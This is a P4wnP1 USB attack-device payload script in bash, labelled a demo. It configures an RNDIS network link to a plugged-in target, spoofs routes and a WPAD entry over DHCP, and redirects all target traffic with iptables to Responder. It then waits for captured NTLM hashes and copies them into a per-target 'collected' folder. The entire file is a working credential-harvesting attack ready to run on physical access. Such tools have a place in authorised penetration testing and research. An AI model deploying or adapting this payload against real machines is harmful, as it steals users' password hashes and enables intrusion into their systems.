# P4wnP1 demo payload by MaMe82
# ==========================
# starts Responder on RNDIS / CDC ECM interface
# prints out stats in several payload stages via HID keyboard on target
# prints out some stats to screen of P4wnP1
# automatically brings Responder screen session to front on login
# (the session could be detached by pressin <CTRL>+<A> , <D>)
# Don't forget to change keyboard language to your locale


# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x2C05"        # Product ID

USE_ECM=false            # if true CDC ECM will be enabled
USE_RNDIS=true          # if true RNDIS will be enabled
USE_HID=false            # if true HID (keyboard) will be enabled
USE_UMS=false           # if true USB Mass Storage will be enabled

# ==========================
# Network and DHCP options
# ==========================

# We choose an IP with a very small subnet (see comments in README.rst)
IF_IP="172.16.0.1" # IP used by P4wnP1
IF_MASK="255.255.255.252" 
IF_DHCP_RANGE="172.16.0.2,172.16.0.2" # DHCP Server IP Range

ROUTE_SPOOF=true # set two static routes on target to cover whole IPv4 range
WPAD_ENTRY=true # provide a WPAD entry via DHCP pointing to responder

# This function gets called after the target network interface is working
# (RNDIS, CDC ECM or both have to be enabled)
function onNetworkUp()
{
	led_blink 1

        iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
        iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT

	#start responder in screen
#        screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"
#        screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -r -f -w -F"
        screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -d -r -w -P"

	touch /tmp/responder_started

	

}

# this function gets called if the target received a DHCP lease
# (DHCP client has to be running on target)
function onTargetGotIP()
{
	led_blink 2

	fname="$target_name""_""$target_ip"
	# count existing folders of this name
	fcount=$(ls -la $wdir/collected/ | grep "$fname" | wc -l)
	fname="$fname""_""$fcount"

	mkdir $wdir/collected/$fname

	# wait for capture NTLM hashes (responder logs are stored to /tmp)
	while [ ! -f logs/*NTLM* ]; do
		#echo .
		sleep 0.5
	done

	mkdir $wdir/collected/$fname

	cp /tmp/Responder* $wdir/collected/$fname
	sync
	led_blink 255 # set LED to solid on
	
}

function onLogin()
{
        led_blink 3
        sudo screen -d -r
        return
}

